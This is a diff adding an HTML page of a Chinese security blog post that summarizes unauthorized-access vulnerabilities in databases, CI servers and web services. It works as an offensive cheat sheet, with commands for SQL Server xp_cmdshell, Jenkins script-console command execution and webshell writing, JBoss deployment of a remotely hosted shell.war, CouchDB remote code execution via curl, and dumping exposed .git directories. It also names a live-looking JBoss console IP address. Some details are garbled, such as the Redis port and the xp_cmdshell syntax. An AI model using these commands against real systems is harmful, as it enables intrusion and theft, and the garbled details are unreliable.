@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    常见未授权访问漏洞总结 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",未授权访问">
+<meta name="description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。
+mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell
+工具：Navicat
+sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见未授权访问漏洞总结 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2021/01/10/常见未授权访问漏洞总结/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。
+mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell
+工具：Navicat
+sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+<meta property="og:updated_time" content="2021-01-10T10:21:35.398Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见未授权访问漏洞总结 | Leticia‘s Blog">
+<meta name="twitter:description" content="前言未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。
+mysql3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell
+工具：Navicat
+sqlserver1433端口未授权访问，可读取数据库内容，可尝试执行master..cmd">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/机器学习/" class="tagc2">机器学习 : 13</a><a href="/tags/笔记/" class="tagc3">笔记 : 13</a><a href="/tags/python/" class="tagc4">python : 12</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/内网渗透/" class="tagc2">内网渗透 : 3</a><a href="/tags/ctf/" class="tagc3">ctf : 3</a><a href="/tags/文件上传/" class="tagc4">文件上传 : 3</a><a href="/tags/linux/" class="tagc5">linux : 2</a><a href="/tags/XSS/" class="tagc1">XSS : 2</a><a href="/tags/redis/" class="tagc2">redis : 2</a><a href="/tags/metasploit/" class="tagc3">metasploit : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc4">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">常见未授权访问漏洞总结</h1>
+    
+    <div class="post-meta">
+      <time datetime="2021-01-10 18:18:52" class="post-meta__date date">2021-01-10 18:18:52</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/未授权访问/">未授权访问</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。</p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell</p>
+<p>工具：Navicat</p>
+<h2 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h2><p>1433端口未授权访问，可读取数据库内容，可尝试执行master..cmdshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">exec master.xp..cmdshell &apos;whoami&apos;</div><div class="line">exec master..cmdshell &apos;dir c:\&apos;</div></pre></td></tr></table></figure></p>
+<p>工具：Navicat</p>
+<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>工具：Navicat，Robo3T</p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>27017端口未授权访问，可读取数据库内容</p>
+<p>可通过四种方式getshell：写webshell、写crontabs、写ssh公钥、Redis主从复制(4.x,5.x)</p>
+<p>工具：Redis-cli,fofa:protocol=redis</p>
+<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop webUI界面未授权访问，如果存在New Application API功能，可尝试getshell</p>
+<p>工具：浏览器，<a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py" target="_blank" rel="external">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p>
+<h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>9200端口未授权访问，可非法操作数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_plugin/head/  web管理界面</div><div class="line">http://ip:9200/_cat/indices  查看集群当前状态</div><div class="line">http://ip:9200/_nodes  查看节点数据</div><div class="line">http://ip:9200/_river/_search  查看数据库敏感信息</div></pre></td></tr></table></figure></p>
+<p>工具：浏览器</p>
+<h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>2181，2182端口未授权访问，可读取敏感信息，或者在Zookeeper集群内执行kill命令</p>
+<p>工具：netcat，<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip" target="_blank" rel="external">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><p>SpringBoot，web中env路径配置文件未授权访问，可暴露大量联动设备密码信息</p>
+<p>工具：浏览器</p>
+<h2 id="ds-store"><a href="#ds-store" class="headerlink" title="ds_store"></a>ds_store</h2><p><a href="http://ip/.ds_store未授权访问，可通过github工具下载web目录" target="_blank" rel="external">http://ip/.ds_store未授权访问，可通过github工具下载web目录</a></p>
+<p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">https://github.com/lijiejie/ds_store_exp</a></p>
+<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>vnc用于远程桌面控制，默认端口在5900-5905之间，此类端口未授权访问会导致恶意用户直接控制受控主机</p>
+<p>工具：VNCview</p>
+<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker的2375端口web未授权访问，可通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</p>
+<p>工具：浏览器</p>
+<h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>Jenkins面板<a href="http://ip:8080/manage" target="_blank" rel="external">http://ip:8080/manage</a><br>未授权访问会允许用户选择执行脚本界面，操作一些系统层命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">println &quot;whoami&quot;.execute().text 命令执行</div><div class="line">new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;); 写webshell</div></pre></td></tr></table></figure>
+<p>工具：浏览器</p>
+<h2 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h2><p>Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet ip 11211 或 nc -vv &lt;target&gt; 11211</div><div class="line">无需用户名密码，可以直接连接memcache服务的11211端口</div><div class="line">stats #查看memcache服务状态</div></pre></td></tr></table></figure>
+<p>工具：netcat，telnet</p>
+<h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>JBOSS的webUI界面<a href="http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell" target="_blank" rel="external">http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">点击JMX CONSOLE未授权访问</div><div class="line">点击jboss.deployment中的deploymentScanner进入应用部署页面</div><div class="line">使用apache搭建远程木马服务器shell.war</div><div class="line">addurl-java.lang.String配置访问木马地址http://&lt;ip&gt;/shell.war</div><div class="line">访问http://ip:8080/shell/</div></pre></td></tr></table></figure>
+<p><a href="http://221.229.247.184:8080/jmx-console/" target="_blank" rel="external">http://221.229.247.184:8080/jmx-console/</a></p>
+<p>工具：浏览器，fofa：”JBoss Management”</p>
+<h2 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h2><p>.svn目录未授权访问，可能导致大量源码泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">svn-extractor.py --url &quot;url with .svn available&quot;</div></pre></td></tr></table></figure>
+<p>工具：<a href="https://github.com/anantshri/svn-extractor" target="_blank" rel="external">https://github.com/anantshri/svn-extractor</a></p>
+<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>.git目录未授权访问，可能导致大量源码泄露</p>
+<p>方法1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget -r -p -np -k http://www.xxx.com/.git/ #先递归批量下载.git目录</div><div class="line">git log #查看网站的提交记录</div><div class="line">git reset --hard [log hash] #恢复到指定版本号</div></pre></td></tr></table></figure></p>
+<p>方法2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.xxx.com/.git/</div></pre></td></tr></table></figure></p>
+<p>工具：git,<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">https://github.com/lijiejie/GitHack</a></p>
+<h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt install nfs-common 安装nfs客户端</div><div class="line">showmount -e xx.xx.xx.xx 查看nfs服务器上的共享目录</div><div class="line">mount -t nfs xx.xx.xx.xx:/grdata /mnt 挂载到本地</div><div class="line">umount /mnt 卸载目录</div></pre></td></tr></table></figure>
+<h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB的webui未授权访问时，可通过 <a href="http://xx.xx.xx.xx:5984/_utils/" target="_blank" rel="external">http://xx.xx.xx.xx:5984/_utils/</a> 页面创建管理员用户，并通过put方式远程代码执行（CVE-2017-12635）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</div><div class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest&apos;</div><div class="line">curl -X PUT &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</div><div class="line">curl -X POST &apos;http://admin:admin@xx.xx.xx.xx:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</div></pre></td></tr></table></figure>
+<p>工具：curl，<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" target="_blank" rel="external">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2021/01/10/常见未授权访问漏洞总结/" target="_blank">常见未授权访问漏洞总结</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2021-01-10 18:18:52<br />
+    <span>最后更新:</span>2021-01-10 18:21:35<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
